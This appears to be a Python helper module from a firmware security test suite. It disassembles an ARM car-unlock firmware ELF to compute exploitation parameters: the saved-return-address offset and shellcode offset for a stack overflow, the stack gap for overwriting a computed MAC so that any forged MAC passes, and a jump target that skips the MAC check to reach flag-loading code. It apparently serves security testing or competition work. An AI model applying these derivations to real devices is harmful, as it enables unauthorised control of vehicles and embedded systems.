"""
Static ELF-analysis helpers shared by the buffer-overflow-to-RCE tests
(test_stack_overflow_poc.py and, eventually, siblings covering other
receive_board_message() call sites - see test_overflow_derivation.py's
module docstring for the staged plan this supports).

Given a compiled firmware ELF, derive_lr_offset_static() parses a vulnerable
function's compiled prologue/epilogue to work out where an attacker-supplied
message_len needs to land, relative to the overflowed buffer, to control that
function's saved return address. See test_stack_overflow_poc.py's module
docstring for the full derivation background (push/sub/add prologue shape,
why the epilogue's `add sp,#N; pop {..,pc}` matters, etc.) - this module just
extracts that derivation so it isn't duplicated per call site.

MAX_MESSAGE_LEN mirrors messages.c's receive path:

    message->message_len = uart_readb(BOARD_UART);   // uint8_t, so 0-255
    uart_read(BOARD_UART, message->buffer, message->message_len);

However large a vulnerable buffer's frame turns out to be, an attacker can
never declare a length past 255 - so a saved-LR slot sitting past that is
provably unreachable for *controlled* RCE via this exact bug, regardless of
what the disassembly says. See OverflowOffsets.reachable.
"""

import re
import subprocess
from dataclasses import dataclass
from pathlib import Path

MAX_MESSAGE_LEN = 255  # uint8_t message_len - see application/source/messages.c


def arm_tool(name: str, *args: str, **kwargs) -> subprocess.CompletedProcess:
    """Run an arm-none-eabi-* binutils/gcc tool and return its completed process."""
    return subprocess.run(["arm-none-eabi-" + name, *args], capture_output=True, text=True, check=True, **kwargs)


def disasm_lines(elf: Path, func: str) -> list[str]:
    """Disassembly lines ('  addr:\\tbytes\\tmnemonic ...') for one function."""
    out = arm_tool("objdump", "-d", f"--disassemble={func}", str(elf)).stdout
    return [line for line in out.splitlines() if re.match(r"^\s*[0-9a-f]+:\t", line)]


@dataclass(frozen=True)
class OverflowOffsets:
    """Everything derived from one vulnerable function's compiled
    prologue/epilogue. lr_slot_offset and shellcode_offset are relative to
    the start of the overflowed buffer; epilogue_addr is an absolute flash
    address. sp_locals_delta = frame_size + pushed_bytes: the amount SP needs
    to be walked back by from the function's *entry* SP to reach the value
    its own `add sp, #frame_size` expects to start from - only relevant if
    something is going to force PC into the middle of the epilogue directly
    (skipping the `sub sp` that would normally have gotten SP there first),
    rather than letting the function return through it naturally."""
    lr_slot_offset: int
    shellcode_offset: int
    epilogue_addr: int
    sp_locals_delta: int

    @property
    def reachable(self) -> bool:
        """Whether a uint8_t message_len (0-255) can supply all 4 bytes of
        the saved-LR slot. False means this exact bug can crash the target
        (a partial overwrite still corrupts *some* of the LR bytes right up
        to the 255-byte wire limit) but can't be turned into controlled RCE
        via this receive call - see MAX_MESSAGE_LEN above."""
        return self.lr_slot_offset + 4 <= MAX_MESSAGE_LEN


def derive_lr_offset_static(elf: Path, func_name: str = "unlockCar") -> OverflowOffsets:
    """Parse func_name's compiled prologue/epilogue out of elf. Expects the
    shape documented in test_stack_overflow_poc.py's module docstring:

        push {..., lr}                 ; N registers, LR last
        sub  sp, #FRAME_SIZE
        add  rBUF, sp, #BUFFER_OFFSET  ; rBUF = &<overflowed local>
        ...
        add  sp, #FRAME_SIZE           ; epilogue, shared by every return path
        pop  {..., pc}                 ; LR (last pushed) popped directly into PC

    Fails loudly (via assert, with the offending disassembly line) if
    func_name's compiled shape doesn't match this - deliberately, rather than
    silently deriving nonsense offsets from a shape this logic doesn't
    actually understand.
    """
    lines = disasm_lines(elf, func_name)
    assert lines, (
        f"{func_name!r} produced no disassembly from {elf} - check the name is spelled "
        f"right and wasn't compiled out (e.g. by a #ifdef TEST_BUILD it lives inside)"
    )

    push_m = re.search(r"push\s*\{([^}]*)\}", lines[0])
    assert push_m and "lr" in push_m.group(1), (
        f"{func_name}'s 1st instruction is no longer 'push {{..., lr}}' "
        f"(got: {lines[0]!r}); derivation needs updating"
    )
    pushed_regs = [r.strip() for r in push_m.group(1).split(",")]

    sub_m = re.search(r"sub\s+sp,\s*#(\d+)", lines[1])
    assert sub_m, (
        f"{func_name}'s 2nd instruction is no longer 'sub sp, #N' "
        f"(got: {lines[1]!r}); derivation needs updating"
    )
    frame_size = int(sub_m.group(1))

    add_m = re.search(r"add\s+r\d+,\s*sp,\s*#(\d+)", lines[2])
    assert add_m, (
        f"{func_name}'s 3rd instruction is no longer 'add rX, sp, #N' "
        f"(got: {lines[2]!r}); derivation needs updating"
    )
    buffer_offset = int(add_m.group(1))

    epilogue_addr = None
    for i in range(len(lines) - 1):
        m1 = re.search(rf"add\s+sp,\s*#{frame_size}\b", lines[i])
        if not m1:
            continue
        m2 = re.search(r"pop\s*\{([^}]*)\}", lines[i + 1])
        if m2 and "pc" in m2.group(1):
            epilogue_addr = int(re.match(r"\s*([0-9a-f]+):", lines[i]).group(1), 16)
            break
    assert epilogue_addr is not None, (
        f"Couldn't find {func_name}'s 'add sp, #{frame_size}' / 'pop {{..., pc}}' "
        f"epilogue; derivation needs updating"
    )

    pushed_bytes = len(pushed_regs) * 4
    lr_slot_offset = frame_size + pushed_bytes - 4 - buffer_offset
    shellcode_offset = lr_slot_offset + 4
    sp_locals_delta = frame_size + pushed_bytes
    return OverflowOffsets(lr_slot_offset, shellcode_offset, epilogue_addr, sp_locals_delta)


# ============================================================================
# Return-into-existing-code target (see test_overflow_derivation.py's Stage 3
# notes): the flash address to forge the saved LR to when the goal is to
# re-enter an existing, already-correct code path - e.g. the loadFlag()/
# uart_write() block guarded by unlockCar()'s MAC check - rather than inject
# and jump to fresh shellcode. Needs no live SP, no shellcode, and (per
# derive_lr_offset_static's own docstring) survives the natural
# `pop {..., pc}` return path unmodified.
# ============================================================================

MAC_COMPARE_LEN = 8  # bytes actually compared - see car.c:
                      # `memcmp(computed_mac, received_mac, 8)` right after
                      # unlockCar()'s RESPONSE_MAGIC receive. computed_mac
                      # itself is 16 bytes (AES_CMAC_digest always writes a
                      # full block), but only the first 8 are ever checked.


@dataclass(frozen=True)
class MacOverwriteOffsets:
    """Everything derived for the adjacent-local MAC-bypass bug: unlike
    OverflowOffsets above (which hijacks a saved return address),
    mac_gap/mac_len describe overflowing one plain stack local
    (received_mac[8]) far enough to land inside a *different*, unrelated
    local (computed_mac[16]) that happens to share the same frame - not into
    anything struct-related, so there's no offsetof() to fall back on;
    mac_gap is purely "however the compiler happened to lay these two out
    this build". mac_gap is the byte distance from the start of the
    attacker-controlled buffer to the start of the buffer it's checked
    against; mac_len is how many leading bytes of that buffer the comparison
    actually reads (see MAC_COMPARE_LEN)."""
    mac_gap: int
    mac_len: int

    @property
    def payload_len(self) -> int:
        """Total bytes needed to both populate the attacker-controlled
        buffer with a forged MAC and repeat it far enough to overwrite the
        real one - see overflow_search.py's _craft_mac_bypass_payload()."""
        return self.mac_gap + self.mac_len

    @property
    def reachable(self) -> bool:
        """Whether a uint8_t message_len (0-255) can deliver the full
        payload - see MAX_MESSAGE_LEN above. Expected to be trivially true
        here (mac_gap is a handful of bytes, nowhere near the LR-slot-sized
        offsets OverflowOffsets.reachable guards against), but checked
        explicitly rather than assumed."""
        return self.payload_len <= MAX_MESSAGE_LEN


def _resolve_sp_offset(lines: list[str], before_idx: int, reg: str, max_hops: int = 4) -> int:
    """Walk backward from lines[:before_idx], resolving `reg` to a constant
    sp-relative offset. Handles the two shapes seen in this codebase for
    getting a local's address into an argument register: either directly
    (`add rX, sp, #N`) or copied from another register that was set up
    earlier (`mov rX, rY`, then rY itself resolved the same way) - the latter
    is why `push {..., lr}`-adjacent code can reuse the same base register
    (e.g. r6) across an entire function while still passing it around via
    `mov` right before each call that needs it. Follows at most max_hops such
    `mov` indirections before giving up. Fails loudly (assert), not silently,
    if `reg` can't be traced back to an `add ..., sp, #N` at all - that means
    this shape assumption no longer holds and the derivation needs updating,
    not a wrong offset returned to the caller."""
    for _ in range(max_hops):
        add_re = re.compile(rf"\badd\s+{reg},\s*sp,\s*#(\d+)\b")
        mov_re = re.compile(rf"\bmov\s+{reg},\s*(r\d+)\b")
        next_hop = None
        for j in range(before_idx - 1, -1, -1):
            m = add_re.search(lines[j])
            if m:
                return int(m.group(1))
            m = mov_re.search(lines[j])
            if m:
                next_hop = (j, m.group(1))
                break
        if next_hop is None:
            break
        before_idx, reg = next_hop
    assert False, (
        f"Couldn't resolve {reg!r} back to an 'add {reg}, sp, #N' within {max_hops} "
        f"mov-indirection hop(s) of line index {before_idx}; derivation needs updating"
    )


def derive_mac_overwrite_offsets(
    elf: Path,
    func_name: str = "unlockCar",
    response_magic: int = 0x59,  # RESPONSE_MAGIC - application/include/messages.h
    mac_call: str = "AES_CMAC_digest",
    overflow_call: str = "receive_board_message_by_type",
    buffer_field_offset: int = 8,
    mac_len: int = MAC_COMPARE_LEN,
) -> MacOverwriteOffsets:
    """Derive the MAC-bypass bug's key number: the byte distance ("mac_gap")
    from the start of func_name's attacker-controlled MAC-response buffer
    (unlockCar()'s received_mac[8]) to the start of the locally-computed MAC
    it gets checked against (computed_mac[16]). Both are plain stack locals,
    not struct members, so there's no offsetof() to read this from - it has
    to come from the compiled layout, the same way derive_lr_offset_static()
    reads the frame shape rather than trusting source-level assumptions.

    Unlike derive_lr_offset_static (which hijacks a saved return address),
    this bug doesn't touch control flow at all: receive_board_message_by_type()
    writes exactly `message_len` attacker-controlled bytes into received_mac
    with no bounds check, and if that run is long enough to also reach
    computed_mac's own memory - which happens well before the MAC comparison
    that follows - an attacker can make the tail of their own payload
    overwrite computed_mac with a copy of whatever they just put in
    received_mac. The comparison then degenerates into "does this buffer
    equal the copy of itself an attacker just wrote", true for *any* forged
    value, with no CMAC key needed at all.

    Locates:
      1. the `bl <overflow_call>` that receives the response, pinned down by
         the `movs r1, #<response_magic>` that sets up its magic argument
         (func_name makes more than one such call for different messages;
         this identifies the right one by the value actually sent on the
         wire, not by call order),
      2. the register stored into the message struct's buffer-pointer field
         (`str[d] rX, ..., [sp, #buffer_field_offset]`) shortly before that
         call, resolved back to its own frame offset via _resolve_sp_offset -
         this is received_mac's address,
      3. the nearest preceding `bl <mac_call>` (the computed_mac producer
         this response is checked against) and its 4th argument (r3, the
         output buffer), resolved the same way - this is computed_mac's
         address.

    mac_gap is (2)'s offset subtracted from (1)'s. Fails loudly (assert) if
    any of these shapes don't match what's expected, rather than silently
    deriving a wrong gap - see this module's other derive_* functions for the
    same policy."""
    lines = disasm_lines(elf, func_name)
    assert lines, (
        f"{func_name!r} produced no disassembly from {elf} - check the name is spelled "
        f"right and wasn't compiled out (e.g. by a #ifdef TEST_BUILD it lives inside)"
    )

    overflow_call_re = re.compile(rf"\bbl\s+[0-9a-f]+\s*<{re.escape(overflow_call)}>")
    magic_re = re.compile(rf"movs\s+r1,\s*#{response_magic}\b")

    call_idx = None
    for i, line in enumerate(lines):
        if not overflow_call_re.search(line):
            continue
        if any(magic_re.search(lines[j]) for j in range(max(i - 8, 0), i)):
            call_idx = i
            break
    assert call_idx is not None, (
        f"No 'bl <{overflow_call}>' preceded (within 8 lines) by 'movs r1, #{response_magic}' "
        f"found in {func_name} - either the RESPONSE_MAGIC receive isn't there in this build, "
        f"response_magic is wrong, or derivation needs updating"
    )

    buf_store_re = re.compile(
        rf"str[d]?\.?w?\s+(r\d+),\s*(?:r\d+,\s*)?\[sp,\s*#{buffer_field_offset}\]"
    )
    store_idx = next((j for j in range(call_idx - 1, -1, -1) if buf_store_re.search(lines[j])), None)
    assert store_idx is not None, (
        f"No buffer-pointer store to '[sp, #{buffer_field_offset}]' found before the "
        f"RESPONSE_MAGIC receive in {func_name}; derivation needs updating"
    )
    overflow_reg = buf_store_re.search(lines[store_idx]).group(1)
    overflow_offset = _resolve_sp_offset(lines, store_idx, overflow_reg)

    mac_call_re = re.compile(rf"\bbl\s+[0-9a-f]+\s*<{re.escape(mac_call)}>")
    mac_idx = next((j for j in range(call_idx - 1, -1, -1) if mac_call_re.search(lines[j])), None)
    assert mac_idx is not None, (
        f"No preceding 'bl <{mac_call}>' found before the RESPONSE_MAGIC receive in "
        f"{func_name} - can't identify the computed_mac this response is checked against"
    )
    mac_offset = _resolve_sp_offset(lines, mac_idx, "r3")

    return MacOverwriteOffsets(mac_gap=mac_offset - overflow_offset, mac_len=mac_len)


def derive_reentry_addr(elf: Path, func_name: str, callee_name: str) -> int:
    """Find the address to redirect execution into to skip whatever check(s)
    guard entry to a `callee_name` call inside `func_name`, landing at the
    very start of the straight-line block that calls it - without needing
    debug info (car.c has none in a plain, non-debug=True build - see
    SConstruct:149-150 - so this can't use addr2line/source-line lookup).

    Locates the first `bl <callee_name>` in func_name's disassembly, then
    walks backward to the nearest preceding branch instruction (any of
    b/beq/bne/bls/bhi/ble/bgt/blt/bge/cbnz/cbz - deliberately not bl/blx,
    which return to the next instruction rather than guarding fall-through
    the same way), and returns the address of the instruction right after
    that branch: the entry point of whichever basic block the call sits in,
    reachable identically whether the compiler placed it as a fall-through
    or an explicit jump target.

    This is a pattern-matched STATIC guess, not a proof - only a real
    breakpoint hit during genuine, unmodified execution actually confirms it
    (see test_reentry_addr_hit_during_normal_unlock). Fails loudly if
    func_name's disassembly doesn't contain the expected shape, rather than
    silently returning a wrong address.
    """
    lines = disasm_lines(elf, func_name)
    assert lines, (
        f"{func_name!r} produced no disassembly from {elf} - check the name is spelled "
        f"right and wasn't compiled out (e.g. by a #ifdef TEST_BUILD it lives inside)"
    )

    call_re = re.compile(rf"\bbl\s+[0-9a-f]+\s*<{re.escape(callee_name)}>")
    branch_re = re.compile(
        r"\b(?:b|beq|bne|bls|bhi|ble|bgt|blt|bge|cbnz|cbz)(?:\.n|\.w)?\s+(?:r\d+,\s*)?[0-9a-f]+\s*<"
    )

    call_idx = next((i for i, line in enumerate(lines) if call_re.search(line)), None)
    assert call_idx is not None, (
        f"No 'bl <{callee_name}>' found in {func_name}'s disassembly - either it isn't called "
        f"there in this build (e.g. TEST_BUILD strips the call site entirely - see car.c's "
        f"#ifndef TEST_BUILD block) or callee_name is wrong"
    )

    branch_idx = next((i for i in range(call_idx - 1, -1, -1) if branch_re.search(lines[i])), None)
    assert branch_idx is not None, (
        f"No branch instruction found before the 'bl <{callee_name}>' call in {func_name} - "
        f"can't identify a guarded block entry point; derivation needs updating"
    )

    return int(re.match(r"\s*([0-9a-f]+):", lines[branch_idx + 1]).group(1), 16)
